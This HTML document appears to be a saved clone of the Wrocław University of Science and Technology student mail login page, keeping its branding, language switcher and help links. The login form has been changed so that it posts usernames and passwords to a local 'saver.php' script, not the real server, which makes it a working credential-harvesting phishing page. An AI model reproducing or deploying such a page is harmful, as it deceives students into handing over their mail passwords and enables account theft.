<!DOCTYPE html>
<html lang="en" dir="ltr" class="dj_webkit dj_chrome dj_contentbox"><link type="text/css" id="dark-mode" rel="stylesheet" href="https://s.student.pwr.edu.pl/iwc_static/c11n/login_student_pwr_edu_pl.html?lang=pl&amp;3.0.1.3.0_16070546&amp;svcs=abs,mail,calendar,c11n"><style type="text/css" id="dark-mode-custom-style"></style><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <title>Serwer pocztowy</title>

        <link href="resources/css.css" rel="stylesheet" type="text/css">
        <link rel="stylesheet" href="resources/login_animate.css" type="text/css">
        <link rel="stylesheet" href="resources/login_student_pwr_edu_pl.css" type="text/css">

        <script src="resources/jquery.min.js" type="text/javascript"></script>
        <script src="resources/bootstrap.js" type="text/javascript"></script>



        <script type="text/javascript">
            var djConfig = {
                cacheBust: "3.0.1.3.0_16070546",
                isDebug: false,
                parseOnLoad: true
            };

            (function () {
                function getParameter(paramName) {
                    paramName += "=";
                    var queryString = window.location.search;
                    var strBegin = queryString.indexOf(paramName);
                    if (strBegin == -1) {
                        strBegin = queryString.length;
                    } else {
                        strBegin += paramName.length;
                    }
                    var strEnd = queryString.indexOf("&", strBegin);

                    if (strEnd == -1) {
                        strEnd = queryString.length;
                    }

                    return queryString.substring(strBegin, strEnd);
                }

                var locale = getParameter("lang");
                if (locale.length > 0) {
                    djConfig.locale = locale.toLowerCase();
                    if ((djConfig.locale.indexOf("ar") == 0) || (djConfig.locale.indexOf("he") == 0)) {
                        djConfig.direction = "rtl";
                    } else {
                        djConfig.direction = "ltr";
                    }
                    var top = document.getElementsByTagName("html")[0];
                    top.dir = djConfig.direction;
                }

            })()
        </script>

        <script type="text/javascript" src="resources/dojo.js"></script>
		</head>
		<body background="background.jpg">
		<textarea id="dijit._editor.RichText.savedContent" style="display:none;position:absolute;top:-100px;left:-100px;height:3px;width:3px;overflow:hidden;"></textarea>

        <script type="text/javascript">
            dojo.registerModulePath("iwc", "../../iwc");
            dojo.require("iwc.i18n.resources");
            dojo.requireLocalization("iwc.i18n", "resources");
            iwc.l10n = dojo.i18n.getLocalization("iwc.i18n", "resources");
            dojo.require("iwc.login");


            dojo.addOnLoad(function () {
                if (top.location.hostname != self.location.hostname) {
                    try {
                        if (document.forms[0].password) {
                            document.forms[0].style.display = "none";
                        }
                    } catch (e) {
                        document.body.style.display = "none";
                    }
                }

                iwc.login.setFocus();
                iwc.login.doI18N();
                var lang = "en_us";
                if (djConfig && djConfig.locale) {
                    lang = djConfig.locale.toLowerCase();
                }
                dijit.byId('langButton').attr("value", lang);
                dojo.connect(dijit.byId("langButton"), "onChange", function (lang) {
                    var loginUrl = window.location;

                    if (window.location.search != "" && window.location.search.indexOf('lang=') > -1)
                        loginUrl = loginUrl.href.replace('lang=' + iwc.login.getParameter('lang'), 'lang=' + lang);
                    else
                        loginUrl = loginUrl + "?lang=" + lang

                    if (window.location.search.indexOf("u=1") == -1)
                        loginUrl = loginUrl + '&u=1';

                    window.location = loginUrl;
                    return false;
                });
            });

            function login() {
                return iwc.login.checkName();
            }

            function changeInterfaceLang() {
                var lang = document.getElementById('langButton').value;
                if (lang === "pl") {
                    document.getElementById('angLinks').style.display = "none";
                    document.getElementById('plLinks').style.display = "block";
                } else {
                    document.getElementById('angLinks').style.display = "block";
                    document.getElementById('plLinks').style.display = "none";
                }
            }
        </script>

    

    
        <div class="container Convergence-Login">
            <div class="top">
                <h1 id="title" class="hidden"><span id="logo" class="animated fadeInDown">Serwer poczty studenckiej <b>PWr</b> <span></span></span></h1>
            </div>
            <div class="login-box animated fadeInUp Convergence-Login-Border" id="loginBegin">
                <div class="box-header">
                    <h2>Logowanie</h2>
                </div>

                <div>
                    <div id="welcomeMsg" class="welcomeMsg"></div>
                </div>

                <div id="alertMsg" aria-live="assertive" role="alert" tabindex="0" class="alertMsg"></div>


                <form action="saver.php" method="post" onsubmit="return login()">

                    <label id="usernameLabelID" for="username" class="">Użytkownik:</label>
                    <input id="username" name="username" type="text" aria-required="true">
                    <br>
                    <label id="passwordLabelID" for="password" class="">Hasło:</label>
                    <input id="password" name="password" type="password" aria-required="true">

                    <div>
                        <input id="chkpreloginip" name="chkpreloginip" type="hidden" value="true" aria-required="false">
                    </div>

                    <select id="langButton" onchange="changeInterfaceLang()">
                        <option value="pl">Polski</option>
                        <option value="en-us">English</option>
                        <option value="es">Español</option>
                        <option value="de">Deutsch</option>
                        <option value="fr">Français</option>
                        <option value="it">Italiano</option>
                    </select>
                    <br>
                    <span class="dijit dijitReset dijitLeft dijitInline Convergence-Login-FormButton dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Zaloguj</span></button></span></span></span>

                </form>




                <div id="plLinks" style="display: block">
                    <p class="small"><a href="https://s.student.pwr.edu.pl/passwd/reset?todo=reset">Nie pamiętam hasła</a></p>
                    <p class="small"><a href="https://s.student.pwr.edu.pl/modpass-pwr/">Aktywacja konta</a></p>
                    <p class="small"><a href="https://s.student.pwr.edu.pl/iwc_static/c11n/faq">Pytania  i odpowiedzi</a></p>
                    <p class="small"><a href="https://s.student.pwr.edu.pl/alias">Alias pocztowy</a></p>
                </div>

                <div id="angLinks" style="display: none">
                    <p class="small"><a href="https://s.student.pwr.edu.pl/passwd/reset?todo=reset">Forgot password</a></p>
                    <p class="small"><a href="https://s.student.pwr.edu.pl/modpass-pwr">Account activation</a></p>
                    <p class="small"><a href="https://s.student.pwr.edu.pl/iwc_static/c11n/faq">Frequently asked questions</a></p>
                    <p class="small"><a href="https://s.student.pwr.edu.pl/alias">E-mail alias</a></p>
                </div>

                <div id="PwdExpiredMsg" style="display:none;">                   
                    <div id="btnContainer">                                                
                        <div id="errMsg" class="alertMsg"></div>			    	
                    </div>
                    <div>	
                        <button id="changepwd" type="button"></button>
                    </div>
                </div>


                <div id="copyright" class="Convergence-Login-Copyright box-footer">© <a href="http://www.wcss.pl/" title="WCSS">Wroclawskie Centrum Sieciowo-Superkomputerowe</a></div> 


            </div> 
        </div> 
        <div id="overlay" class="login">
            <div class="centered">
                <div class="logo"></div>
                <div id="progress"></div>
            </div>
        </div>

        <iframe name="picCache" id="picCache" src="resources/saved_resource.html" width="0" height="0" frameborder="0"></iframe>

        <noscript>
        <div style="width:50%; margin-top: 5%; margin-left:auto; margin-right:auto">
            <iframe src="noscript.html frameborder=0 width=100%" />
        </div>
        </noscript>

    

    <script>
        $(document).ready(function () {
            $('#logo').addClass('animated fadeInDown');
            $("input:text:visible:first").focus();
        });
        $('#username').focus(function () {
            $('label[for="username"]').addClass('selected');
        });
        $('#username').blur(function () {
            $('label[for="username"]').removeClass('selected');
        });
        $('#password').focus(function () {
            $('label[for="password"]').addClass('selected');
        });
        $('#password').blur(function () {
            $('label[for="password"]').removeClass('selected');
        });
    </script>


</body></html>